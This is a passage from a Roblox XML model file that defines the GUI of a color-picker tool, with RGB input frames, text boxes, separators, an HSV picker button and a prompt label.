										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX8A6A14200D3F4040B59C0C4698F32E7C">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXEADEDB8E65E64F518184C1379764A8A0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXAF5499D676D545E9868B73AF3957427F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190335</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>3</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-3</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBXA1C125A479C647568C877A65468D2E31">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">255</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX7AE971FA0EC74052A55E09024B50B437">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">GInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>77</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>38</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXC2FB660B530149F49A5CCAC0264E81CD">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX6FF80F2C976145C3B9F0F1E63B6BF7EE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX7708715A0CDD4982A455D132AB9C1C37">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278255360</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>3</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-3</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX640E65B43A2A496AA68F45F57BD35B2B">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">255</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXD5104DB645BA49BD87A24C2FE9A056E4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">RInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>38</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXCF0A4E93B269423D989F1AC945EBD038">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX77943F6833124D6FB61E57DC55267B99">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0C2D3D395EC5410DA5DC76F3995021F7">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294901760</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>3</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-3</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX39DD54523DF64B84A2D82513FFEF096F">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">255</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX48209FE0816D42F3A092331BB3A23A5C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4284572001</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Separator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>156</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>4</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXCB113E3785AE4BBC8FBB9DF122E9F5C1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4284572001</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Separator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>156</XO>
											<YS>0</YS>
											<YO>16</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>4</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXACBF258619964306BF4253524FC5F751">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4284572001</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Separator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>156</XO>
											<YS>0</YS>
											<YO>10</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>4</XO>
											<YS>0</YS>
											<YO>4</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBXC7C57EA904C4445FA411230927D89742">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.400000006</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">HSVPicker</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>165</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>27</XO>
											<YS>0</YS>
											<YO>27</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
									<Item class="Frame" referent="RBX3570B3376A5C454CAFBF3A7262D4D101">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.75</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="TextLabel" referent="RBX6C036899D28041B6987E2CCA333BDFB6">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">SelectNote</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>27</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>15</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">Select something to use this tool.</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">true</bool>
